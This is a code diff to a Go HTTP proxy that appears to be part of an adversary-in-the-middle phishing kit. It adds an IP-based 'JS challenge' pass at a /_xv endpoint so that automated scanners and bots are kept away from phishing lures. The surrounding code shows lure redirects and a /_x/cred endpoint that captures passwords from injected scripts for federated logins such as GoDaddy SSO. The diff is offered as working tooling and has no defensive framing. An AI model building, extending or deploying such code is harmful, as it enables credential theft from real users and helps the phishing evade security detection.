@@ -82,9 +82,11 @@ type HttpProxy struct {
 	developer         bool
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
+	challengedIPs     map[string]int64 // IP → unix timestamp when JS challenge was passed
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	challenge_mtx     sync.Mutex
 }
 
 type ProxySession struct {
@@ -123,6 +125,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
+		challengedIPs:     make(map[string]int64),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
@@ -338,6 +341,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// /_xv — JS challenge pass signal. The challenge page POSTs here after
+			// the timing gate and bot checks pass. Server records the IP so the next
+			// request (the reload) is let through without serving the challenge again.
+			if req.Method == "POST" && req.URL.Path == "/_xv" {
+				p.challenge_mtx.Lock()
+				p.challengedIPs[from_ip] = time.Now().Add(5 * time.Minute).Unix()
+				p.challenge_mtx.Unlock()
+				resp := goproxy.NewResponse(req, "application/json", 200, "{}")
+				resp.Header.Set("Access-Control-Allow-Origin", "*")
+				return req, resp
+			}
+
 			// /_x/cred — JS-injected credential capture for federated providers (GoDaddy SSO, etc.)
 			// The injected script POSTs the password here so we don't depend on session cookie.
 			if req.Method == "POST" && req.URL.Path == "/_x/cred" {
@@ -463,7 +478,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 								// JS challenge gate — bots that don't execute JS never pass.
-								if !ValidChallengeCookie(req, req_path, p.challengeSecret) {
+								if !p.isChallengePassed(from_ip) {
 									return ChallengeResponse(req, req.Host, req_path, p.challengeSecret)
 								}
 
@@ -674,7 +689,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// JS challenge gate — must pass before any redirect
-						if !ValidChallengeCookie(req, req_path, p.challengeSecret) {
+						if !p.isChallengePassed(from_ip) {
 							return ChallengeResponse(req, req.Host, req_path, p.challengeSecret)
 						}
 						// redirect from lure path to login url
@@ -2090,6 +2105,20 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
 	return nil
+}
+
+func (p *HttpProxy) isChallengePassed(ip string) bool {
+	p.challenge_mtx.Lock()
+	defer p.challenge_mtx.Unlock()
+	exp, ok := p.challengedIPs[ip]
+	if !ok {
+		return false
+	}
+	if time.Now().Unix() > exp {
+		delete(p.challengedIPs, ip)
+		return false
+	}
+	return true
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
